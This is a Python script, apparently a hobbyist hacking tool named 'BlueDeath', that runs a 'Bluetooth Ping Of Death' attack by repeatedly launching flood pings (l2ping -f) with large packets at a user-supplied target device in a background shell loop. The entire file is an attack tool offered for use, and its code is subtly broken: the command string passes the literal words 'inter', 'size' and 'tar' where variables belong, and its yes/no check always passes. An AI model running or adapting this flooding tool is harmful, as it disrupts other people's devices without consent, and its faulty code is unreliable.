#!/usr/bin/env python3

import os
import subprocess
from time import sleep as ts

R = "\033[91m" 
P = "\033[95m" 
C = "\033[96m" 
DC = "\033[36m" 
B = "\033[94m" 
G = "\033[92m" 
Y = "\033[93m" 
W = "\033[0m"
BOLD = "\033[1m"

banner = R+"""
 ▄▄▄▄    ██▓     █    ██ ▓█████▄▄▄█████▓ ▒█████   ▒█████  ▄▄▄█████▓ ██░ ██ 
▓█████▄ ▓██▒     ██  ▓██▒▓█   ▀▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓  ██▒ ▓▒▓██░ ██▒
▒██▒ ▄██▒██░    ▓██  ▒██░▒███  ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒ ▓██░ ▒░▒██▀▀██░
▒██░█▀  ▒██░    ▓▓█  ░██░▒▓█  ▄░ ▓██▓ ░ ▒██   ██░▒██   ██░░ ▓██▓ ░ ░▓█ ░██ 
░▓█  ▀█▓░██████▒▒▒█████▓ ░▒████▒ ▒██▒ ░ ░ ████▓▒░░ ████▓▒░  ▒██▒ ░ ░▓█▒░██▓
░▒▓███▀▒░ ▒░▓  ░░▒▓▒ ▒ ▒ ░░ ▒░ ░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░   ▒ ░░    ▒ ░░▒░▒
▒░▒   ░ ░ ░ ▒  ░░░▒░ ░ ░  ░ ░  ░   ░      ░ ▒ ▒░   ░ ▒ ▒░     ░     ▒ ░▒░ ░
 ░    ░   ░ ░    ░░░ ░ ░    ░    ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░       ░  ░░ ░
 ░          ░  ░   ░        ░  ░            ░ ░      ░ ░            ░  ░  ░
      ░                                                                    
"""+G+"""Author"""+W+""": otx2s
"""+G+"""Github"""+W+""": https://github.com/otx2s
"""+G+"""Version"""+W+""": 1.0
"""+W

def main():
    try:
        print(banner)
        inter = input(B+"INTERFACE"+W+" (default: hci0) > ") or "hci0"
        tar = input(B+"TARGET"+W+" > ")
        size = int(input(B+"SIZE"+W+" (default: 600) > ") or 600)
        print(G+"-"*30+W)
        start = input("Do you want to start: (Y/n) ")
        if start == 'y' or 'Y':
            print(G+"\n[+]"+W+" Bluetooth Ping Of Death Attack Started ...")
            try:
                for i in range(1, 10000):
                    xterm_1 = "l2ping -i inter -s size -f tar &"
                    subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                    ts(3)
            except(KeyboardInterrupt, OSError):
                print(R+"[-]"+W+" Something Is Wrong!")
                main()
        elif start == 'n' or 'N':
            print("\n[*] Exiting...")
            ts(1)
        else:
            print("Check your command!")
            main()
    except(KeyboardInterrupt):
        print("\n[*] Exiting...")

if __name__ == '__main__':
    main()